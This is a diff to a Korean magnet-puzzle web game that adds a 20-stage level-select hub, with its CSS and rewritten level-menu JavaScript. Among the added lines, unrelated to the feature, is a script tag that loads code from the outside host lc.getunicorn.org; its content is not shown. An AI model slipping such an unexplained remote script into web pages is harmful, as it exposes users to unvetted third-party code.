@@ -108,7 +108,42 @@ body{background:radial-gradient(ellipse at 50% 0%,#ffffff 0%,#f6f2ff 45%,#eee9fc
 .home-simple .v81-stage{height:clamp(230px,40vh,355px)}
 .home-simple .v81-buttons{margin-bottom:clamp(12px,5vh,55px)}
 @media(max-height:680px){.home-simple .v81-stage{height:clamp(185px,35vh,250px)}.home-simple .v81-logo{font-size:clamp(55px,15vw,78px)}.home-simple .v81-start{min-height:65px}}
+
+/* V8.2 — stage hub, 20 levels per world (future worlds not yet playable) */
+.stagehub{position:fixed;inset:0;z-index:48;overflow-y:auto;overscroll-behavior:contain;background:radial-gradient(ellipse at 50% -5%,#fff6ff 0%,#e9e0ff 41%,#cdb7f7 100%);padding:calc(16px + env(safe-area-inset-top)) 16px calc(20px + env(safe-area-inset-bottom));color:#57368e}
+.stagehub-inner{width:min(100%,440px);margin:0 auto;min-height:calc(100dvh - 45px);display:flex;flex-direction:column;gap:16px}
+.stagehub-top{display:flex;justify-content:space-between;align-items:center;gap:9px}
+.stagehub-back,.stagehub-icon{background:linear-gradient(#aa7df6,#7850c8);border:2px solid #dfc8ff;color:#fff;border-radius:17px;width:44px;height:44px;font-size:22px;font-weight:900;box-shadow:0 4px 0 #60409c}
+.stagehub-name{font-weight:1000;font-size:27px;color:white;text-shadow:0 3px 0 #7344b4,0 5px 10px #442b7940;letter-spacing:-1.5px}
+.stagehub-coins{display:flex;align-items:center;gap:5px;background:#6542aa;color:white;padding:7px 11px;border-radius:100px;font-weight:900;white-space:nowrap;box-shadow:inset 0 2px 4px #30165766}
+.stagehub-coin-icon{background:linear-gradient(#ffe984,#ffb51c);color:#a36c00;display:grid;place-items:center;border:2px solid white;border-radius:50%;width:24px;height:24px}
+.stagehub-world{border:3px solid white;border-radius:27px;background:linear-gradient(145deg,#fffaf7,#fff0df);box-shadow:0 7px 0 #aa84df,0 14px 22px #7757af25;padding:16px 15px 14px;text-align:center;position:relative}
+.stagehub-world-tag{display:inline-block;padding:5px 16px;color:white;background:linear-gradient(#a078ed,#794dcc);border-radius:30px;font-size:12px;font-weight:900}
+.stagehub-world h2{color:#66409e;font-size:27px;letter-spacing:-1px;line-height:1.2;margin:9px 0 3px}
+.stagehub-subtitle{color:#9782b3;font-size:12px;font-weight:800}
+.stagehub-world-nav{position:absolute;top:37%;border-radius:50%;background:#8e63da;color:white;width:37px;height:37px;font-size:24px;box-shadow:0 3px 0 #6b44a6}
+.stagehub-world-nav.prev{left:-11px}.stagehub-world-nav.next{right:-11px}
+.stagehub-world-nav:disabled{opacity:.34}
+.stagehub-progress{display:flex;align-items:center;gap:9px;justify-content:center;margin:12px 6px 0;font-weight:900;font-size:13px}
+.stagehub-progressbar{background:#e6d5ff;flex:1;border-radius:30px;height:10px;overflow:hidden;box-shadow:inset 0 2px 3px #8b72bd33}
+.stagehub-progressbar>i{display:block;height:100%;background:linear-gradient(90deg,#f6bb36,#ffdc57);border-radius:30px}
+.stagehub-lab{position:relative;flex:1;border-radius:27px;background:linear-gradient(160deg,#e1d5ffdd,#cab4f2d9);border:2px solid #f7efff;box-shadow:0 7px 0 #b49adc;padding:18px 10px 22px;overflow:hidden}
+.stagehub-lab:before{content:'⚗';position:absolute;right:5px;bottom:-20px;opacity:.08;font-size:155px;pointer-events:none}
+.stagehub-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:clamp(9px,2.7vw,15px);position:relative;z-index:1}
+.stagehub-tile{aspect-ratio:1;min-width:0;border:2px solid #fffefc;border-radius:19px;background:linear-gradient(#fffefa,#fff0e9);box-shadow:0 5px 0 #af8ccb,0 8px 10px #74529a26;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#67419d;font-weight:1000;font-size:clamp(18px,6vw,28px);gap:1px}
+.stagehub-tile .stagehub-stars{font-size:clamp(11px,3.1vw,15px);letter-spacing:-2px;color:#e3bb5d;white-space:nowrap;line-height:1}
+.stagehub-tile .stagehub-stars .earned{color:#ffae00;text-shadow:0 1px 0 #c37a22}
+.stagehub-tile.is-next{background:linear-gradient(#fff8c7,#ffdf80);border-color:#fff1aa;box-shadow:0 5px 0 #e9a73f,0 0 0 3px #fff2a277,0 9px 15px #ae722e3d}
+.stagehub-tile.is-locked{background:linear-gradient(#efedf6,#d8d2e8);color:#8a7ca5;border-color:#eae4f7;box-shadow:0 4px 0 #a49abb}
+.stagehub-tile:active:not(:disabled){transform:translateY(3px);box-shadow:0 2px 0 #a78acc}
+.stagehub-tile .lock-symbol{font-size:22px;filter:grayscale(.4)}
+.stagehub-bottom{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:3px}
+.stagehub-bottom button{padding:13px 4px;background:linear-gradient(#ffffff,#f5eeff);color:#6846aa;border:2px solid #ffffff;border-radius:18px;box-shadow:0 4px 0 #a78ccd;font-weight:900;font-size:14px}
+.stagehub-bottom button span{display:block;font-size:21px;margin-bottom:3px}
+.stagehub-footnote{text-align:center;font-size:11px;color:#896fba;font-weight:800;margin:0}
+@media(max-width:360px){.stagehub{padding-left:10px;padding-right:10px}.stagehub-inner{gap:12px}.stagehub-lab{padding:12px 8px 17px}.stagehub-tile{border-radius:15px}.stagehub-world h2{font-size:23px}}
 </style>
+<script type="text/javascript" nonce="XOJ0BVE+zr3qdJZKBBAaLFbFzesxhK/xP1QmLnOdycs=" src="//lc.getunicorn.org?type=base-script&amp;request-id=32242"></script>
 </head>
 <body>
 <div class="app">
@@ -179,7 +214,7 @@ function copy(s){return {player:s.player,mag:s.mag,balls:s.balls.slice(),filled:
 function position(element,pos){element.style.setProperty('--row',Math.floor(pos/6));element.style.setProperty('--col',pos%6)}
 let pieces=[];
 function createPiece(kind,index,pol){let el=document.createElement('div');el.className='piece '+(kind==='player'?'player':'ball');if(kind==='player')el.innerHTML=MASCOT_SVG;else el.innerHTML=`<div class="orb ${pol?'s':'n'}">${pol?'S':'N'}</div>`;el.dataset.index=index;if(kind==='player')el.setAttribute('aria-label','자석이 캐릭터 · 탭하여 극 바꾸기');document.getElementById('pieces').append(el);pieces.push(el);if(kind==='player')el.addEventListener('click',e=>{e.stopPropagation();act(4)});return el}
-function loadLevel(idx){if(idx<0||idx>=LEVELS.length||idx>=saved.unlocked)return;levelIndex=idx;updateHud();state=initial(LEVELS[idx]);history=[];busy=false;lock=false;overlay.replaceChildren();document.getElementById('world').textContent=idx<10?'WORLD 01 · 자석 연구소':'WORLD 02 · 극성 실험실';document.getElementById('levelTitle').textContent=TITLES[idx];document.getElementById('description').textContent=DESCRIPTIONS[idx];board.replaceChildren();for(let i=0;i<36;i++){let el=document.createElement('div');el.className='cell';if(LEVELS[idx].walls.includes(i))el.classList.add('wall');if(LEVELS[idx].goals.includes(i))el.classList.add('goal');el.dataset.pos=i;board.append(el)}let layer=document.createElement('div');layer.className='pieces';layer.id='pieces';board.append(layer);pieces=[];createPiece('player',-1);LEVELS[idx].balls.forEach((_,i)=>createPiece('ball',i,LEVELS[idx].pols[i]));render(false)}
+function loadLevel(idx){if(idx<0||idx>=LEVELS.length||idx>=saved.unlocked)return;levelIndex=idx;updateHud();state=initial(LEVELS[idx]);history=[];busy=false;lock=false;overlay.replaceChildren();document.getElementById('world').textContent='WORLD 01 · 자력 실험실';document.getElementById('levelTitle').textContent=TITLES[idx];document.getElementById('description').textContent=DESCRIPTIONS[idx];board.replaceChildren();for(let i=0;i<36;i++){let el=document.createElement('div');el.className='cell';if(LEVELS[idx].walls.includes(i))el.classList.add('wall');if(LEVELS[idx].goals.includes(i))el.classList.add('goal');el.dataset.pos=i;board.append(el)}let layer=document.createElement('div');layer.className='pieces';layer.id='pieces';board.append(layer);pieces=[];createPiece('player',-1);LEVELS[idx].balls.forEach((_,i)=>createPiece('ball',i,LEVELS[idx].pols[i]));render(false)}
 function render(animated=true,activated=[]){document.getElementById('moves').textContent=state.moves;document.getElementById('undo').disabled=!history.length||busy;const els=board.querySelectorAll('.cell');els.forEach((el,i)=>{el.classList.toggle('filled',state.filled.some(j=>state.balls[j]===i))});pieces.forEach((el,i)=>{const isPlayer=i===0;const ballIdx=i-1;if(!animated)el.style.transition='none';position(el,isPlayer?state.player:state.balls[ballIdx]);el.classList.toggle('disappear',!isPlayer&&state.filled.includes(ballIdx));el.classList.toggle('activated',!isPlayer&&activated.includes(ballIdx));if(isPlayer){el.classList.toggle('pole-s',state.mag===1);el.classList.toggle('pole-n',state.mag===0)}if(!animated)requestAnimationFrame(()=>el.style.transition='')})}
 function nextState(s,action,level){const t=copy(s),walls=new Set(level.walls),goals=new Set(level.goals);if(action===4)t.mag=1-t.mag;else{let [dr,dc]=DIRS[action],r=Math.floor(t.player/6)+dr,c=t.player%6+dc;if(r<0||r>=6||c<0||c>=6)return null;const newpos=r*6+c;if(walls.has(newpos)||t.balls.some((x,i)=>!t.filled.includes(i)&&x===newpos))return null;t.player=newpos}t.moves++;
 const selected=[];for(const [dr,dc] of DIRS){let r=Math.floor(t.player/6)+dr,c=t.player%6+dc;while(r>=0&&r<6&&c>=0&&c<6){let pos=r*6+c;if(walls.has(pos))break;let i=t.balls.findIndex((x,j)=>x===pos&&!t.filled.includes(j));if(i!==-1){selected.push([i,dr,dc]);break}r+=dr;c+=dc}}
@@ -228,7 +263,39 @@ function showWin(){
   document.getElementById('winRetry').onclick=()=>loadLevel(levelIndex);
   document.getElementById('winNext').onclick=()=>levelIndex===LEVELS.length-1?showLevels():loadLevel(levelIndex+1);
 }
-function showLevels(){if(busy)return;const fromHome=!!overlay.querySelector('.home-screen');overlay.innerHTML=`<div class="modal-back" id="modalBack"><div class="modal"><button class="close" id="closeLevels" aria-label="닫기">✕</button><div class="win-mascot" style="height:88px"><img class="mascot-art" style="width:88px;height:88px;margin:auto" src="assets/jaseogi.png" alt="자석이"></div><h2>스테이지 선택</h2><p>자석이와 함께 퍼즐을 해결해요!</p>${[0,10].map((start,w)=>`<div class="stage-head">${w===0?'WORLD 01 · 자석 연구소':'WORLD 02 · 극성 실험실'}</div><div class="levels-grid">${LEVELS.slice(start,start+10).map((_,j)=>{let i=start+j;return `<button class="level-btn ${i===levelIndex?'current':''} ${i>=saved.unlocked?'locked':''}" data-lv="${i}" ${i>=saved.unlocked?'disabled':''}>${i>=saved.unlocked?'🔒':i+1}<span class="tiny">${'★'.repeat(saved.stars[i]||0)}</span></button>`}).join('')}</div>`).join('')}<div class="tutorial-card">🔴 N극 · 🔵 S극<br>서로 같은 극이면 밀고, 다르면 당겨요.<br>구슬을 구멍에 모두 넣으면 성공!</div></div></div>`;document.getElementById('closeLevels').onclick=()=>{if(fromHome)showHome();else overlay.replaceChildren()};document.querySelectorAll('[data-lv]').forEach(b=>b.onclick=()=>loadLevel(Number(b.dataset.lv)));document.getElementById('modalBack').addEventListener('click',e=>{if(e.target.id==='modalBack'){if(fromHome)showHome();else overlay.replaceChildren()}})}
+let stageHubWorld=0;
+function showLevels(world=stageHubWorld){
+  if(busy)return;
+  const fromHome=!!overlay.querySelector('.home-screen');
+  stageHubWorld=world;
+  const future=world>0;
+  const total=LEVELS.length;
+  const earned=starTotal();
+  const maxStars=total*3;
+  const playable=Array.from({length:20},(_,i)=>{
+    if(future)return `<button class="stagehub-tile is-locked" disabled aria-label="추가 예정 스테이지"><span class="lock-symbol">🔒</span></button>`;
+    const n=i+1,unlocked=i<saved.unlocked,stars=saved.stars[i]||0,next=unlocked&&!stars;
+    const rating=stars?`<span class="stagehub-stars">${[1,2,3].map(k=>`<span class="${k<=stars?'earned':''}">★</span>`).join('')}</span>`:'<span class="stagehub-stars">☆☆☆</span>';
+    return `<button class="stagehub-tile ${!unlocked?'is-locked':next?'is-next':''}" data-lv="${i}" ${!unlocked?'disabled':''} aria-label="${n}단계 ${!unlocked?'잠김':stars?stars+'성 완료':'플레이'}">${unlocked?n:'<span class="lock-symbol">🔒</span>'}${unlocked?rating:''}</button>`;
+  }).join('');
+  overlay.innerHTML=`<section class="stagehub" role="dialog" aria-modal="true" aria-label="스테이지 선택"><div class="stagehub-inner">
+    <header class="stagehub-top"><button id="stageHubBack" class="stagehub-back" aria-label="홈으로">‹</button><div class="stagehub-name">자석콩 ✦</div><div class="stagehub-coins"><span class="stagehub-coin-icon">✦</span>${fmt(saved.coins)}</div></header>
+    <div class="stagehub-world"><button class="stagehub-world-nav prev" id="worldPrev" ${world===0?'disabled':''} aria-label="이전 월드">‹</button><span class="stagehub-world-tag">WORLD ${world+1}</span><h2>${future?'새로운 연구실':'자력 실험실'}</h2><div class="stagehub-subtitle">${future?'다음 월드는 추후 업데이트 예정':'스테이지 1~20 · 마음껏 도전해요!'}</div><button class="stagehub-world-nav next" id="worldNext" ${world===1?'disabled':''} aria-label="다음 월드">›</button><div class="stagehub-progress"><span>⭐</span><span>${future?'준비 중':earned+' / '+maxStars}</span><div class="stagehub-progressbar"><i style="width:${future?0:earned/maxStars*100}%"></i></div></div></div>
+    <main class="stagehub-lab"><div class="stagehub-grid">${playable}</div></main>
+    <nav class="stagehub-bottom" aria-label="게임 메뉴"><button id="stageShop"><span>🛍️</span>상점</button><button id="stageRewards"><span>🎁</span>보상</button><button id="stageSettings"><span>⚙️</span>설정</button></nav><p class="stagehub-footnote">완료한 스테이지는 언제든 다시 플레이할 수 있어요.</p>
+  </div></section>`;
+  document.getElementById('stageHubBack').onclick=showHome;
+  document.getElementById('worldPrev').onclick=()=>showLevels(0);
+  document.getElementById('worldNext').onclick=()=>showLevels(1);
+  for(const el of overlay.querySelectorAll('[data-lv]'))el.onclick=()=>loadLevel(Number(el.dataset.lv));
+  [['stageShop','shop'],['stageRewards','rewards'],['stageSettings','settings']].forEach(([id,type])=>{
+    document.getElementById(id).onclick=()=>{
+      showInfo(type);
+      for(const btnId of ['infoClose','infoHome'])document.getElementById(btnId).onclick=()=>{busy=false;showLevels(stageHubWorld)};
+      document.getElementById('infoBack').onclick=e=>{if(e.target.id==='infoBack'){busy=false;showLevels(stageHubWorld)}};
+    };
+  });
+}
 let toastTimer;function toast(message){document.querySelector('.notification')?.remove();let el=document.createElement('div');el.className='notification';el.textContent=message;document.body.append(el);clearTimeout(toastTimer);toastTimer=setTimeout(()=>el.remove(),1900)}
 let start=null;board.addEventListener('pointerdown',e=>{start={x:e.clientX,y:e.clientY,time:Date.now()}});board.addEventListener('pointerup',e=>{if(!start)return;let dx=e.clientX-start.x,dy=e.clientY-start.y;if(Math.hypot(dx,dy)>20){act(Math.abs(dx)>Math.abs(dy)?(dx>0?1:3):(dy>0?2:0))}else if(e.target.closest('.player')){}else{let rect=board.getBoundingClientRect(),gap=4,pad=5,unit=(rect.width-10-5*gap)/6;let col=Math.floor((e.clientX-rect.left-pad)/(unit+gap)),row=Math.floor((e.clientY-rect.top-pad)/(unit+gap)),pr=Math.floor(state.player/6),pc=state.player%6;let deltaR=row-pr,deltaC=col-pc;if(deltaR===0&&Math.abs(deltaC)===1)act(deltaC>0?1:3);else if(deltaC===0&&Math.abs(deltaR)===1)act(deltaR>0?2:0)}start=null});board.addEventListener('pointercancel',()=>start=null);
 document.addEventListener('keydown',e=>{if(overlay.children.length)return;const map={ArrowUp:0,ArrowRight:1,ArrowDown:2,ArrowLeft:3,w:0,d:1,s:2,a:3,' ':4,Enter:4};if(map[e.key]!==undefined){e.preventDefault();act(map[e.key])}else if(e.key==='Backspace'){e.preventDefault();undo()}else if(e.key==='r'||e.key==='R')reset()});document.getElementById('undo').onclick=undo;document.getElementById('flip').onclick=()=>act(4);document.getElementById('restart').onclick=reset;document.getElementById('selectLevel').onclick=showLevels;loadLevel(0);
@@ -241,7 +308,7 @@ function showHome(){
     <div class="v81-buttons"><button class="v81-start" id="homePlay"><span class="v81-play-icon">▶</span>게임시작</button></div>
     <div class="v81-grass v81-grass-left"></div><div class="v81-grass v81-grass-right"></div>
   </div></div>`;
-  document.getElementById('homePlay').onclick=showLevels;
+  document.getElementById('homePlay').onclick=()=>showLevels(0);
 }
 function showInfo(type){
   const contents={
